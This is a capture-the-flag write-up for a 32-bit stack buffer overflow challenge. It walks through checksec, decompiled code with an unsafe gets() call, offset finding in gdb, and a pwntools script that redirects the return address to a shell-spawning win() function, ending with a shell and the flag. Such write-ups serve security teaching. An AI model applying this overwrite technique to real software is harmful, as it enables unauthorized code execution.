# &#35; chall_02

#### &#42; purpose
1. find offset to input variable and  vuln()'s ret
2. try to overwrite ret with win()


#### &#42; execute
```bash
## 1 file
$ ls chall_02
chall_02

## 32-bit LSB, dynamically linked and not stripped
$ file chall_02
chall_02: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=03a977e1e301cf30f31c1145cd14bdbbf0e89cb6, for GNU/Linux 3.2.0, not stripped

## only Partial RELRO
$ checksec --file=./chall_02
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73) Symbols	  No	0		2		./chall_02

## just do input twice
$ ./chall_02
Went along the mountain side.
AAAA
BBBB

```

#### &#42; decompile using ghidra
```c
## vulerable point is gets(local_3e) in vuln() : stack overflow
void main(void)

{
  char local_24 [20];
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  puts("Went along the mountain side.");
  fgets(local_24,19,stdin);
  vuln();
  return;
}

void vuln(void)

{
  char local_3e [54];
  
  gets(local_3e);
  return;
}

## need to change ret to win()
void win(void)

{
  system("/bin/sh");
  return;
}

```

#### &#42; structure of stack
```bash
local_3e[54] + dummy[4] + sfp[4] + ret[4] 
=> buf[58] + sfp[4] + ret[4]
=> payload[62] + ret[win()]


$ cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

$ cyclic -l 0x61716161
62
$ cyclic -l aaqa
62


gef➤  r
Starting program: /pwn/sunshine/02/chall_02
warning: Error disabling address space randomization: Operation not permitted
Went along the mountain side.
ZZZZ
>>> "A"*54+"B"*8+"CCCC"
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCC'
>>>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCC

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffe7b4ae  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebx   : 0x42424242 ("BBBB"?)
$ecx   : 0xf7eec580  →  0xfbad2288
$edx   : 0xffe7b4f0  →  0xf7eec300  →  0xf7e92d3d  →  "ISO-10646/UTF8/"
$esp   : 0xffe7b4f0  →  0xf7eec300  →  0xf7e92d3d  →  "ISO-10646/UTF8/"
$ebp   : 0x42424242 ("BBBB"?)
$esi   : 0xf7eec000  →  0x001ead6c
$edi   : 0xf7eec000  →  0x001ead6c
$eip   : 0x43434343 ("CCCC"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffe7b4f0│+0x0000: 0xf7eec300  →  0xf7e92d3d  →  "ISO-10646/UTF8/"	 ← $esp
0xffe7b4f4│+0x0004: 0x00040000
0xffe7b4f8│+0x0008: 0x00000000
0xffe7b4fc│+0x000c: "ZZZZ\n"
0xffe7b500│+0x0010: 0x0000000a
0xffe7b504│+0x0014: 0xffe7b5c4  →  0xffe7c87e  →  "/pwn/sunshine/02/chall_02"
0xffe7b508│+0x0018: 0xffe7b5cc  →  0xffe7c898  →  "SHELL=/bin/bash"
0xffe7b50c│+0x001c: 0x080492e1  →  <__libc_csu_init+33> lea ebx, [ebp-0xf4]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x43434343
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall_02", stopped 0x43434343 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p/d 0x44
$1 = 68
gef➤


```

#### &#42; payload(python)
```python
payload  = b"A"*62
payload += b"B"*4
payload += p32(win)

```

#### &#42; analysis binary using gdb
```bash

gef➤  disas main
Dump of assembler code for function main:
   0x08049251 <+0>:	endbr32
.
.
.
   0x08049296 <+69>:	call   0x80490a0 <fgets@plt>
   0x0804929b <+74>:	add    esp,0x10
   0x0804929e <+77>:	call   0x8049225 <vuln>
   0x080492a3 <+82>:	nop                       => ret addr of vuln()
   0x080492a4 <+83>:	lea    esp,[ebp-0x8]
   0x080492a7 <+86>:	pop    ecx
   0x080492a8 <+87>:	pop    ebx
   0x080492a9 <+88>:	pop    ebp
   0x080492aa <+89>:	lea    esp,[ecx-0x4]
   0x080492ad <+92>:	ret

gef➤  disass vuln
Dump of assembler code for function vuln:
   0x08049225 <+0>:	endbr32
   0x08049229 <+4>:	push   ebp
   0x0804922a <+5>:	mov    ebp,esp
   0x0804922c <+7>:	push   ebx
   0x0804922d <+8>:	sub    esp,0x44
   0x08049230 <+11>:	call   0x80492ae <__x86.get_pc_thunk.ax>
   0x08049235 <+16>:	add    eax,0x2dcb
   0x0804923a <+21>:	sub    esp,0xc
   0x0804923d <+24>:	lea    edx,[ebp-0x3a]
   0x08049240 <+27>:	push   edx
   0x08049241 <+28>:	mov    ebx,eax
   0x08049243 <+30>:	call   0x8049090 <gets@plt>
   0x08049248 <+35>:	add    esp,0x10
   0x0804924b <+38>:	nop
   0x0804924c <+39>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804924f <+42>:	leave
   0x08049250 <+43>:	ret
End of assembler dump.
gef➤

gef➤  x/32xw 0xffd19d1c
0xffd19d1c:	0x424217e0	0x42424242	0x42424242	0x42424242
0xffd19d2c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffd19d3c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffd19d4c:	0x42424242	0x42424242	0x42424242	0x00424242
0xffd19d5c:	0x080492a3	0xf7ec03fc	0x00040000	0x00000000
0xffd19d6c:	0x41414141	0x0000000a	0xffd19e34	0xffd19e3c
0xffd19d7c:	0x080492e1	0xffd19da0	0x00000000	0x00000000
0xffd19d8c:	0xf7cf3ee5	0xf7ec0000	0xf7ec0000	0x00000000

gef➤  x/xw 0xffd19d5c
0xffd19d5c:	0x080492a3          => ret of vuln()
gef➤  p/d 0xffd19d5c-0xffd19d1e
$1 = 62
gef➤

```


#### &#42; make exploit code
```python
$ cat exp.py
from pwn import *

filename = 'chall_02'
conn = process(filename)
elf = ELF(filename)

win = elf.symbols["win"]

print( conn.recvuntil("Went along the mountain side.\n") )

payload  = b"Z"*4
conn.sendline(payload)

with open("payload", "wb") as fd:
    fd.write(payload+"\n")

payload  = b"A"*62
payload += p32(win)

conn.send(payload)


with open("payload", "ab") as fd:
    fd.write(payload)

conn.interactive()


```


#### &#42; try to exploit
```bash
$ python2 exp.py
[!] Could not find executable 'chall_02' in $PATH, using './chall_02' instead
[+] Starting local process './chall_02': pid 2601
[*] '/pwn/sunshine/02/chall_02'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
Went along the mountain side.

[*] Switching to interactive mode
$
$ cat flag.txt
sun{warmness-on-the-soul-3b6aad1d8bb54732}
$

```
